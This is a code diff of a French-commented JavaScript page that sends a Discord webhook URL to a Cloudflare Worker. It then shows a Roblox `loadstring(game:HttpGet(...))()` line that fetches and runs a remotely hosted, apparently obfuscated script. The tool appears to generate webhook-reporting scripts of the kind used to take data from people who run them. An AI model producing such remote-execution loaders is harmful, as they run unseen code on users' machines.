@@ -1,4 +1,4 @@
-// script.js – Version finale (Mars 2026) – Encoding + pastefy auto via Worker
+// script.js – Version corrigée : affichage direct sur site + format loadstring exact
 
 function isValidDiscordWebhook(url) {
   const prefix = "https://discord.com/api/webhooks/";
@@ -28,10 +28,10 @@ document.getElementById('webhookForm').addEventListener('submit', async function
     return;
   }
 
-  // Désactive le bouton pendant le traitement
+  // Désactive bouton pendant traitement
   const submitBtn = this.querySelector('button[type="submit"]');
   submitBtn.disabled = true;
-  submitBtn.textContent = "Processing...";
+  submitBtn.textContent = "Génération...";
 
   try {
     const response = await fetch("https://throbbing-dream-62ca.imran-ouarezki-f0c.workers.dev/", {
@@ -51,30 +51,31 @@ document.getElementById('webhookForm').addEventListener('submit', async function
       throw new Error(data.error);
     }
 
-    // Affiche le script final (le plus court)
+    // On affiche EXACTEMENT le format demandé
+    const finalText = `loadstring(game:HttpGet("${data.rawUrl}"))()`;
+
     const luaArea = document.getElementById('luaScript');
-    luaArea.value = data.finalScript;
+    luaArea.value = finalText;
     luaArea.style.display = "block";
 
-    document.getElementById('resultTitle').textContent = "Script obfuscé & hébergé automatiquement !";
+    document.getElementById('resultTitle').textContent = "Script final prêt à copier !";
     document.getElementById('resultTitle').style.display = "block";
 
     document.getElementById('copyBtn').style.display = "inline-block";
 
-    // Message de succès
-    alert("Succès ! Script prêt à copier.\nLien raw : " + data.rawUrl);
+    // Pas d'alerte, tout s'affiche sur le site
+    console.log("[SUCCESS] Script généré :", finalText);
 
   } catch (err) {
     alert("Erreur : " + err.message + "\nVérifie ta connexion ou réessaie.");
     console.error("Erreur fetch Worker :", err);
   } finally {
-    // Réactive le bouton
     submitBtn.disabled = false;
     submitBtn.textContent = "Gen Your Script";
   }
 });
 
-// Bouton copier
+// Bouton copier (copie le contenu exact)
 document.getElementById('copyBtn').addEventListener('click', function() {
   const luaArea = document.getElementById('luaScript');
   luaArea.select();
@@ -82,8 +83,10 @@ document.getElementById('copyBtn').addEventListener('click', function() {
   
   try {
     navigator.clipboard.writeText(luaArea.value);
-    alert("Script copié dans le presse-papiers !");
+    // Petit feedback visuel sans alerte lourde
+    this.textContent = "Copié !";
+    setTimeout(() => { this.textContent = "Copy Script"; }, 2000);
   } catch (err) {
-    alert("Erreur copie : " + err.message + "\nSélectionne et copie manuellement.");
+    alert("Erreur copie : sélectionne et copie manuellement.");
   }
 });
